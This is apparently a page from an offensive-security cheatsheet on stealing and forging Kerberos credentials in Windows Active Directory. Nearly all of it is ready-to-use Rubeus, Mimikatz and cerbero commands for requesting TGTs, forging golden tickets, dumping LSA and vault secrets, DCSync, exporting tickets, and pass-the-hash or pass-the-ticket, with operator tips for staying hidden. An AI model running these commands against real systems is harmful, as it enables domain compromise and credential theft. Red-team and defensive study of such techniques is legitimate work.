---
layout: post
title: credentials / krb
category: 04-credentials
parent: cheatsheets
modified_date: 2023-06-09
permalink: /creds/krb
---

**Mitre Att&ck Entreprise**: [T1558 Steal and Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/) 

**Menu**
<!-- vscode-markdown-toc -->
* 1. [cleartext-2-nthash](#cleartext-2-nthash)
* 2. [get-tgt](#get-tgt)
* 3. [vault](#vault)
* 4. [lsadump-lsa](#lsadump-lsa)
* 5. [lsadump-dcsync](#lsadump-dcsync)
* 6. [ccache-convert](#ccache-convert)
* 7. [krb-export](#krb-export)
* 8. [krb-pth](#krb-pth)
* 9. [krb-ptt](#krb-ptt)

<!-- vscode-markdown-toc-config
	numbering=true
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

**Which OS? What Creds?**
![Windows Credentials by Auth. Service & by OS](/assets/images/win-delpy-creds-table-by-os-til-2012.png)

**Tools**

<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
<script>$(window).load(function() {var mm = ["https://api.github.com/repos/GhostPack/Rubeus","https://api.github.com/repos/Flangvik/BetterSafetyKatz","https://api.github.com/repos/gentilkiwi/mimikatz",]; for (rep in mm) {$.ajax({type: "GET", url: mm[rep], dataType: "json", success: function(result) {$("#mm_list").append("<tr><td><a href='" + result.html_url + "' target='_blank'>" + result.name + "</a></td><td>" + result.pushed_at + "</td><td>" + result.stargazers_count + "</td><td>" + result.subscribers_count + "</td><td>" + result.language + "</td></tr>"); console.log(result);}});}console.log(result);});</script>

<link href="/sortable.css" rel="stylesheet" />
<script src="/sortable.js"></script>
<div id="mm">
    <table id="mm_list" class="sortable">
      <tr><th>_repo</th><th>_last_pushed</th><th>_stars</th><th>_watch</th><th>_language</th></tr>
    </table>
</div>

##  1. <a name='cleartext-2-nthash'></a>cleartext-2-nthash
```
# compute nthash from clear-text password
cerbero hash $ztarg_user_pass -u $zdom_fqdn/$ztarg_user_name
$ztarg_user_nthash=""
$ztarg_user_aes256k=""
```

##  2. <a name='get-tgt'></a>get-tgt
```powershell
cerbero ask -u $zdom_fqdn/$ztarg_user_name@ztarg_dc_fqdn --aes $ztarg_user_aes256k -k $zdom_dc_ip -vv
cerbero ask -u $zdom_fqdn/$ztarg_user_name@ztarg_computer_fqdn --aes $ztarg_user_aes256k -k $zdom_dc_ip -vv

./Rubeus.exe asktgt /user:$ztarg_user_name /password:$ztarg_user_pass /domain:$zdom /dc:$zdom_dc_fqdn /ptt
Invoke-Mimi -Command '"sekurlsa::ekeys"'
```

##  3. <a name='vault'></a>golden
```powershell
# contains secrets for the: scheduled tasks, ...
Rubeus.exe -args golden /aes256:$ztarg_user_hash /sid:$ztarg_user_sid /ldap /user:$ztarg_user_name /printcmd
```

##  3. <a name='vault'></a>vault
```powershell
# contains secrets for the: scheduled tasks, ...
Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
```

##  4. <a name='lsadump-lsa'></a>lsadump-lsa
```powershell
# dump lsa process
Invoke-Mimi -Command '"token::elevate" "lsadump::lsa /patch"'
```
##  5. <a name='lsadump-dcsync'></a>lsadump-dcsync
```powershell
# dcsync
Invoke-Mimi -Command '"token::elevate" "lsadump::dcsync"'
```

##  6. <a name='ccache-convert'></a>ccache-convert

```python
# Convert linux to windows krb ticket :
ticketConverter.py $ztarg_user_name".ccache" $ztarg_user_name".krb"
cerbero convert -i $ztarg_user_name".ccache" -o $ztarg_user_name".krb"
```

##  7. <a name='krb-export'></a>krb-export
```powershell
cd C:\tools\mimikatz\x64
mimikatz.exe privilege:debug
kerberos::list /export
```

##  8. <a name='krb-pth'></a>krb-pth
```powershell
# run powershell with pass-the-hash
mimikatz.exe
privilege::debug
sekurlsa::pth /user:$zlat_user /rc4:xxx  /domain:$zdom /dc:$zdom_dc_fqdn /run:"powershell -ep bypass"

# opth
Rubeus.exe -args %Pwn% /user:$ztarg_user_name /aes256:$ztarg_user_hash /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

```

##  9. <a name='krb-ptt'></a>krb-ptt
```bash
# Request a TGT as the target user and pass it into the current session
# NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs
.\Rubeus.exe asktgt /user:$ztarg_user_name /rc4:$ztarg_user_hash /ptt

# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)
.\Rubeus.exe asktgt /user:$ztarg_user_name /rc4:$ztarg_user_hash /createnetonly:C:\Windows\System32\cmd.exe
```


